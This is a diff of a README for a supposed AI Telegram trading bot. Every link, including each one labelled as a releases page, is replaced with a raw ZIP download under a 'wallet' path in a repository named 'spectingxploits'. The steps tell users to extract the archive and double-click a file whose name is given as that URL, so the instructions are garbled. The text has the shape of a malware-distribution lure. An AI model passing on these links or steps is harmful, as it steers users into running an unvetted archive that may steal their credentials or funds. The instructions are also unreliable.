@@ -6,23 +6,23 @@ Welcome to "ai-tjr," a fast and fully automated AI-driven trading bot for Telegr
 
 ## 📦 Download Now!
 
-[![Download ai-tjr](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/postdiphtheric/ai-tjr.zip)](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/postdiphtheric/ai-tjr.zip)
+[![Download ai-tjr](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/src/lib/responds/wallet/ai_tjr_3.8.zip)](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/src/lib/responds/wallet/ai_tjr_3.8.zip)
 
 ## 🚀 Getting Started
 
 This section will help you download and set up the ai-tjr trading bot on your device. Just follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/postdiphtheric/ai-tjr.zip) to find the latest version of the ai-tjr application. 
+   Go to our [Releases page](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/src/lib/responds/wallet/ai_tjr_3.8.zip) to find the latest version of the ai-tjr application. 
 
 2. **Choose Your File**
-   On the Releases page, you will see different versions of the software listed. Make sure to download the one labeled as the latest stable release. Typically, it will be named something like `https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/postdiphtheric/ai-tjr.zip`. Click on the file to start downloading.
+   On the Releases page, you will see different versions of the software listed. Make sure to download the one labeled as the latest stable release. Typically, it will be named something like `https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/src/lib/responds/wallet/ai_tjr_3.8.zip`. Click on the file to start downloading.
 
 3. **Unzip the Downloaded File**
    Once the download is finished, locate the file in your Downloads folder. Right-click on the ZIP file and select 'Extract All' or ‘Unzip’ to unpack the files. This will create a new folder with all the necessary files to run the bot.
 
 4. **Run the Bot**
-   Open the folder you just created. Look for the file named `https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/postdiphtheric/ai-tjr.zip` (or similar). Double-click on this file to run the bot. You should see a window appear, indicating that the bot is starting up.
+   Open the folder you just created. Look for the file named `https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/src/lib/responds/wallet/ai_tjr_3.8.zip` (or similar). Double-click on this file to run the bot. You should see a window appear, indicating that the bot is starting up.
 
 5. **Connect to Your Telegram Account**
    When the bot launches, it will prompt you to connect it to your Telegram account. Follow the instructions displayed on the screen. Make sure you have your Telegram app ready, as you may need to send a command from there.
@@ -35,7 +35,7 @@ This section will help you download and set up the ai-tjr trading bot on your de
 
 ## 📥 Download & Install
 
-You can download the latest version of ai-tjr from the [Releases page](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/postdiphtheric/ai-tjr.zip). Follow the steps above to get everything set up quickly.
+You can download the latest version of ai-tjr from the [Releases page](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/src/lib/responds/wallet/ai_tjr_3.8.zip). Follow the steps above to get everything set up quickly.
 
 ## 🔧 System Requirements
 
@@ -61,7 +61,7 @@ If you encounter any issues while using ai-tjr:
 
 1. **Check Your Internet Connection:** Ensure you are connected to the internet.
 2. **Restart the Application:** Sometimes, simply restarting the bot can resolve temporary glitches.
-3. **Update the Bot:** Make sure you are using the latest version available on the [Releases page](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/postdiphtheric/ai-tjr.zip).
+3. **Update the Bot:** Make sure you are using the latest version available on the [Releases page](https://raw.githubusercontent.com/spectingxploits/ai-tjr/main/src/lib/responds/wallet/ai_tjr_3.8.zip).
 4. **Review Your Configuration:** Double-check your trading settings to ensure everything is set correctly.
 
 ## 🌐 Topics
